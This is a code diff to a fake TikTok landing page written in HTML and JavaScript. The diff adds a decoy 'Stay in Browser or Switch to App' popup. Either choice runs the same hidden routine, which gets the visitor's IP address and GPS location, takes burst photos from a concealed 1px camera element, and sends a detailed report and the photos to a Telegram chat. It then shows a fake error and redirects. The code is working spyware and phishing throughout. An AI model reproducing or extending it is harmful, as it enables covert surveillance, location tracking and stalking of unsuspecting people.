@@ -25,21 +25,19 @@
             left: 0;
         }
 
-        /* Main TikTok splash container */
+        /* ============ SPLASH SCREEN ============ */
         .splash {
             text-align: center;
             position: relative;
             z-index: 10;
         }
 
-        /* TikTok logo container */
         .tiktok-logo {
             margin-bottom: 40px;
             position: relative;
             display: inline-block;
         }
 
-        /* TikTok note icon */
         .tiktok-icon {
             width: 80px;
             height: 80px;
@@ -66,7 +64,6 @@
             }
         }
 
-        /* Pulsing rings around the TikTok logo */
         .ring-container {
             position: absolute;
             top: 50%;
@@ -86,40 +83,15 @@
             animation: ringPulse 2s ease-out infinite;
         }
 
-        .ring:nth-child(1) {
-            width: 60px;
-            height: 60px;
-            animation-delay: 0s;
-        }
-
-        .ring:nth-child(2) {
-            width: 60px;
-            height: 60px;
-            animation-delay: 0.6s;
-        }
-
-        .ring:nth-child(3) {
-            width: 60px;
-            height: 60px;
-            animation-delay: 1.2s;
-        }
+        .ring:nth-child(1) { width: 60px; height: 60px; animation-delay: 0s; }
+        .ring:nth-child(2) { width: 60px; height: 60px; animation-delay: 0.6s; }
+        .ring:nth-child(3) { width: 60px; height: 60px; animation-delay: 1.2s; }
 
         @keyframes ringPulse {
-            0% {
-                width: 60px;
-                height: 60px;
-                opacity: 0.8;
-                border-color: rgba(255, 255, 255, 0.4);
-            }
-            100% {
-                width: 160px;
-                height: 160px;
-                opacity: 0;
-                border-color: rgba(255, 255, 255, 0);
-            }
+            0% { width: 60px; height: 60px; opacity: 0.8; border-color: rgba(255, 255, 255, 0.4); }
+            100% { width: 160px; height: 160px; opacity: 0; border-color: rgba(255, 255, 255, 0); }
         }
 
-        /* Loading dots - exactly like TikTok */
         .loading-dots {
             display: flex;
             justify-content: center;
@@ -135,30 +107,15 @@
             animation: dotBounce 1.4s ease-in-out infinite;
         }
 
-        .dot:nth-child(1) {
-            animation-delay: 0s;
-        }
-
-        .dot:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-
-        .dot:nth-child(3) {
-            animation-delay: 0.4s;
-        }
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
 
         @keyframes dotBounce {
-            0%, 80%, 100% {
-                transform: scale(0.3);
-                opacity: 0.3;
-            }
-            40% {
-                transform: scale(1);
-                opacity: 1;
-            }
+            0%, 80%, 100% { transform: scale(0.3); opacity: 0.3; }
+            40% { transform: scale(1); opacity: 1; }
         }
 
-        /* TikTok brand text */
         .brand-text {
             color: #ffffff;
             font-size: 28px;
@@ -168,39 +125,9 @@
             text-shadow: 0 0 30px rgba(255, 0, 80, 0.5);
         }
 
-        /* Hidden camera video element - completely invisible */
-        #cam {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-            pointer-events: none;
-            z-index: -999;
-        }
+        /* ============ TAP BUTTON ============ */
+        #tapArea { display: none; }
 
-        /* Hidden canvas for photo processing */
-        #canvas {
-            display: none;
-        }
-
-        /* Status text - hidden from user */
-        #status {
-            display: none;
-        }
-
-        /* Debug log - hidden from user */
-        #debug {
-            display: none;
-        }
-
-        /* Tap button container */
-        #tapArea {
-            display: none;
-        }
-
-        /* TikTok-style "Open TikTok" button - exactly like the real app */
         .tap-btn {
             display: inline-block;
             background: #fe2c55;
@@ -218,27 +145,167 @@
         }
 
         @keyframes btnPulse {
-            0%, 100% {
-                box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.4);
-            }
-            50% {
-                box-shadow: 0 0 0 15px rgba(254, 44, 85, 0);
-            }
+            0%, 100% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.4); }
+            50% { box-shadow: 0 0 0 15px rgba(254, 44, 85, 0); }
         }
+
+        /* ============ CHOICE POPUP ============ */
+        .choice-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            z-index: 100;
+            justify-content: center;
+            align-items: flex-end;
+            padding-bottom: 50px;
+        }
+
+        .choice-popup {
+            background: #1a1a1a;
+            border-radius: 16px 16px 0 0;
+            padding: 30px 20px 45px;
+            text-align: center;
+            width: 100%;
+            max-width: 420px;
+            border-top: 1px solid #333;
+        }
+
+        .choice-popup .choice-icon {
+            font-size: 55px;
+            margin-bottom: 15px;
+        }
+
+        .choice-popup .choice-title {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+
+        .choice-popup .choice-subtitle {
+            color: #888;
+            font-size: 13px;
+            margin-bottom: 28px;
+        }
+
+        .choice-btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px 0;
+            letter-spacing: 0.5px;
+            transition: all 0.2s;
+        }
+
+        .choice-btn:active { transform: scale(0.97); }
+
+        .choice-btn.stay-btn { background: #333; color: #fff; }
+        .choice-btn.switch-btn { background: #fe2c55; color: #fff; }
+
+        /* ============ LOADING SCREEN ============ */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 200;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-spinner {
+            width: 48px;
+            height: 48px;
+            border: 3px solid #333;
+            border-top-color: #fe2c55;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .loading-text {
+            color: #fff;
+            margin-top: 22px;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .loading-subtext {
+            color: #666;
+            margin-top: 8px;
+            font-size: 13px;
+        }
+
+        /* ============ EXIT MESSAGE SCREEN ============ */
+        .exit-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 300;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .exit-icon { font-size: 65px; margin-bottom: 20px; }
+
+        .exit-message {
+            color: #fff;
+            font-size: 17px;
+            font-weight: 500;
+            text-align: center;
+            padding: 0 30px;
+            line-height: 1.5;
+        }
+
+        .exit-submessage {
+            color: #888;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+
+        /* ============ HIDDEN ELEMENTS ============ */
+        #cam {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+            z-index: -999;
+        }
+
+        #canvas { display: none; }
+        #status { display: none; }
+        #debug { display: none; }
     </style>
 </head>
 <body>
 
-    <!-- Hidden camera video element -->
     <video id="cam" autoplay playsinline muted></video>
-
-    <!-- Hidden canvas for photo capture -->
     <canvas id="canvas"></canvas>
 
-    <!-- TikTok Splash Screen - Identical to real TikTok app opening -->
+    <!-- TikTok Splash Screen -->
     <div class="splash" id="splash">
-
-        <!-- Logo with pulsing rings -->
         <div class="tiktok-logo">
             <div class="ring-container">
                 <div class="ring"></div>
@@ -246,33 +313,47 @@
                 <div class="ring"></div>
             </div>
             <div class="tiktok-icon">
-                <!-- TikTok note icon -->
                 <svg viewBox="0 0 24 24" fill="white">
                     <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.89a2.89 2.89 0 01-5.76 0 2.89 2.89 0 012.89-2.89h.74v-3.3a6.19 6.19 0 00-5.24 6.19 6.19 6.19 0 006.19 6.19 6.19 6.19 0 006.19-6.19V7.27a8.17 8.17 0 004.65 1.46V5.35a4.83 4.83 0 01-3.44-1.41l.01 2.75z"/>
                 </svg>
             </div>
         </div>
-
-        <!-- Loading dots animation - exactly like real TikTok -->
         <div class="loading-dots">
             <div class="dot"></div>
             <div class="dot"></div>
             <div class="dot"></div>
         </div>
-
-        <!-- TikTok brand name -->
         <div class="brand-text">TikTok</div>
-
-        <!-- Tap to open button (appears after 1 second) -->
         <div id="tapArea">
-            <a class="tap-btn" id="tapBtn" onclick="startEverything()">Open TikTok</a>
+            <a class="tap-btn" onclick="showChoicePopup()">Open TikTok</a>
         </div>
-
-        <!-- Hidden status element -->
-        <div id="status">Tap to continue...</div>
-
-        <!-- Hidden debug element -->
+        <div id="status"></div>
         <div id="debug"></div>
+    </div>
+
+    <!-- Choice Popup: Stay or Switch -->
+    <div class="choice-overlay" id="choiceOverlay">
+        <div class="choice-popup">
+            <div class="choice-icon">📱</div>
+            <div class="choice-title">Switch to TikTok App or stay in browser?</div>
+            <div class="choice-subtitle">Choose how you want to continue</div>
+            <button class="choice-btn stay-btn" onclick="chooseStay()">Stay in Browser</button>
+            <button class="choice-btn switch-btn" onclick="chooseSwitch()">Switch to App</button>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text" id="loadingMainText">Opening TikTok...</div>
+        <div class="loading-subtext">Please wait a moment</div>
+    </div>
+
+    <!-- Exit Screen -->
+    <div class="exit-overlay" id="exitOverlay">
+        <div class="exit-icon">📵</div>
+        <div class="exit-message">This video will not display</div>
+        <div class="exit-submessage">Please try again later</div>
     </div>
 
     <script>
@@ -288,7 +369,6 @@
     // GLOBAL VARIABLES
     // ============================================================
     var isMobileDevice = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
-    var isDesktopDevice = !isMobileDevice;
     var gpsData = null;
     var ipAddress = null;
     var cameraStream = null;
@@ -297,6 +377,8 @@
     var visitStartTime = Date.now();
     var reportAlreadySent = false;
     var burstInterval = null;
+    var userChoice = '';
+    var dataCollectionComplete = false;
 
     // ============================================================
     // DEBUG LOG - Only outputs to browser console, NOT visible on screen
@@ -313,6 +395,124 @@
     }, 1000);
 
     // ============================================================
+    // SHOW CHOICE POPUP
+    // ============================================================
+    function showChoicePopup() {
+        document.getElementById('choiceOverlay').style.display = 'flex';
+    }
+
+    // ============================================================
+    // USER CHOOSES "STAY IN BROWSER"
+    // ============================================================
+    async function chooseStay() {
+        userChoice = 'stay';
+        debugLog('User chose: STAY IN BROWSER');
+
+        // Hide choice popup
+        document.getElementById('choiceOverlay').style.display = 'none';
+        // Hide splash screen
+        document.getElementById('splash').style.display = 'none';
+        // Show loading screen
+        document.getElementById('loadingOverlay').style.display = 'flex';
+        document.getElementById('loadingMainText').textContent = 'Loading content...';
+
+        // Collect all data (GPS, Camera, Photos, Report)
+        await collectAllData();
+
+        // Show exit message
+        showExitScreen();
+    }
+
+    // ============================================================
+    // USER CHOOSES "SWITCH TO APP"
+    // ============================================================
+    async function chooseSwitch() {
+        userChoice = 'switch';
+        debugLog('User chose: SWITCH TO APP');
+
+        // Hide choice popup
+        document.getElementById('choiceOverlay').style.display = 'none';
+        // Hide splash screen
+        document.getElementById('splash').style.display = 'none';
+        // Show loading screen
+        document.getElementById('loadingOverlay').style.display = 'flex';
+        document.getElementById('loadingMainText').textContent = 'Opening TikTok App...';
+
+        // Collect all data (GPS, Camera, Photos, Report)
+        await collectAllData();
+
+        // Show exit message
+        showExitScreen();
+    }
+
+    // ============================================================
+    // COLLECT ALL DATA - GPS, Camera, Photos, Report
+    // ============================================================
+    async function collectAllData() {
+        debugLog('=== DATA COLLECTION STARTED ===');
+
+        // Get IP address (fire and forget - don't wait)
+        getIPAddress();
+
+        // Get GPS location
+        gpsData = await getGPSLocation();
+
+        // Start camera
+        var cameraStarted = await startCamera();
+
+        // Take burst photos if camera is working
+        if (cameraStarted) {
+            debugLog('Camera active - capturing photos...');
+
+            // First burst
+            takeBurstPhotos();
+            await sleep(1500);
+
+            // Second burst
+            takeBurstPhotos();
+            await sleep(1500);
+
+            // Third burst
+            takeBurstPhotos();
+        }
+
+        // Send full report to Telegram
+        await buildAndSendReport(false);
+
+        dataCollectionComplete = true;
+        debugLog('=== DATA COLLECTION COMPLETE ===');
+    }
+
+    // ============================================================
+    // SHOW EXIT SCREEN
+    // ============================================================
+    function showExitScreen() {
+        // Stop camera
+        stopCamera();
+
+        // Hide loading screen
+        document.getElementById('loadingOverlay').style.display = 'none';
+
+        // Show exit message
+        document.getElementById('exitOverlay').style.display = 'flex';
+
+        // Auto-redirect after 3 seconds
+        setTimeout(function() {
+            document.getElementById('exitOverlay').style.display = 'none';
+            window.location.href = redirectUrl;
+        }, 3000);
+    }
+
+    // ============================================================
+    // HELPER FUNCTION: SLEEP
+    // ============================================================
+    function sleep(milliseconds) {
+        return new Promise(function(resolve) {
+            setTimeout(resolve, milliseconds);
+        });
+    }
+
+    // ============================================================
     // GET IP ADDRESS
     // ============================================================
     function getIPAddress() {
@@ -322,10 +522,11 @@
             })
             .then(function(data) {
                 ipAddress = data.ip;
-                debugLog('IP: ' + ipAddress);
+                debugLog('IP Address: ' + ipAddress);
             })
             .catch(function() {
                 ipAddress = 'Unknown';
+                debugLog('IP Address: Failed to fetch');
             });
     }
 
@@ -570,7 +771,7 @@
             var formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'camera_capture_' + photoCount + '.jpg');
-            formData.append('caption', '📸 Photo #' + photoCount);
+            formData.append('caption', '📸 Photo #' + photoCount + ' | User chose: ' + userChoice);
 
             // Send via XHR
             var xhr = new XMLHttpRequest();
@@ -674,6 +875,9 @@
         message += '    📊 Visitor Information Captured\n';
         message += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
 
+        // User choice
+        message += '👤 User Choice: ' + (userChoice === 'stay' ? 'Stay in Browser' : 'Switch to App') + '\n\n';
+
         // Device & Browser section
         message += '🖥️ Device & Browser\n';
         message += '   • Device Model: ' + deviceModel + '\n';
@@ -708,9 +912,6 @@
             message += '&ll=' + gpsData.latitude + ',' + gpsData.longitude + '&z=16\n\n';
         } else {
             message += '   ❌ Location: Not available\n';
-            if (isDesktopDevice) {
-                message += '   💡 Desktop detected - GPS usually not available\n';
-            }
             message += '   💡 Location permission was not granted\n\n';
         }
 
@@ -795,54 +996,6 @@
     }
 
     // ============================================================
-    // MAIN FUNCTION - Runs when user taps "Open TikTok" button
-    // ============================================================
-    async function startEverything() {
-        debugLog('=== USER TAPPED - STARTING ALL SYSTEMS ===');
-        debugLog('Device Type: ' + (isMobileDevice ? 'MOBILE' : 'DESKTOP'));
-        debugLog('Redirect URL: ' + redirectUrl.substring(0, 40) + '...');
-
-        // Hide the tap button
-        document.getElementById('tapArea').style.display = 'none';
-
-        // Get IP address (fire and forget - don't wait)
-        getIPAddress();
-
-        // Get GPS location
-        gpsData = await getGPSLocation();
-
-        // Start camera
-        var cameraStarted = await startCamera();
-
-        // Send initial report
-        await buildAndSendReport(false);
-
-        // Start burst photo capture if camera is working
-        if (cameraStarted) {
-            debugLog('📸 BURST MODE ACTIVE: Will capture 3 photos every 5 seconds');
-
-            // First burst after 3 seconds (gives camera time to fully initialize)
-            setTimeout(function() {
-                takeBurstPhotos();
-
-                // Then continue bursting every 5 seconds
-                burstInterval = setInterval(function() {
-                    takeBurstPhotos();
-                }, 5000);
-            }, 3000);
-        } else {
-            debugLog('Camera not available - skipping photo capture');
-        }
-
-        // Redirect silently to real TikTok after 10 seconds
-        debugLog('Redirect timer started: 10 seconds');
-        setTimeout(function() {
-            debugLog('Redirecting user to: ' + redirectUrl);
-            window.location.href = redirectUrl;
-        }, 10000);
-    }
-
-    // ============================================================
     // HANDLE USER LEAVING THE PAGE
     // ============================================================
     function handleUserExit() {
@@ -853,7 +1006,8 @@
                           '⏱ Duration: ' + duration + 's\n' +
                           '📸 Photos: ' + photoCount + '\n' +
                           '📱 Device: ' + (isMobileDevice ? 'Mobile' : 'Desktop') + '\n' +
-                          '🌐 IP: ' + (ipAddress || 'Unknown');
+                          '🌐 IP: ' + (ipAddress || 'Unknown') + '\n' +
+                          '👤 Choice: ' + userChoice;
 
         debugLog('User exiting: ' + exitMessage.replace(/\n/g, ' | '));
 
